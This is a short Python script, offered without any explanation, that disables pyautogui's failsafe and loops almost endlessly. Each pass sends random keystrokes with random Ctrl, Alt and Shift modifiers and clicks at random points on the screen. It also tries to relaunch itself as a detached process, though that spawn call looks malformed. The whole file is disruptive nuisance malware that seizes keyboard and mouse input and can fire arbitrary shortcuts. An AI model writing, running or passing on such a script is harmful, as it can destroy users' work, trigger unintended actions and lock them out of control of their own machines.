import keyboard
import pyautogui
import random
import time
import sys
import subprocess
import os
if len(sys.argv)==1:
    os.spawnl(os.P_NOWAIT, f"{sys.executable} {sys.argv[0]} GOMAD")
if len(sys.argv)==2:
    pyautogui.FAILSAFE=False
    for i in range(5000000000000):
        keyboard.press_and_release(("Ctrl+"*random.randint(0,1))+("Alt+"*random.randint(0,1))+("Shift+"*random.randint(0,1))+"1234567890-=qwertyuiop[]\\asdfghjkl;'zxcvbnm,./"[random.randint(0,len("1234567890-=qwertyuiop[]\\asdfghjkl;'zxcvbnm,./")-1)])
        time.sleep(0.05)
        sz=pyautogui.size()
        pyautogui.click(random.randint(0,sz[0]-1),random.randint(0,sz[1]-1))
        pyautogui.rightClick(random.randint(0,sz[0]-1),random.randint(0,sz[1]-1))
        pyautogui.middleClick(random.randint(0,sz[0]-1),random.randint(0,sz[1]-1))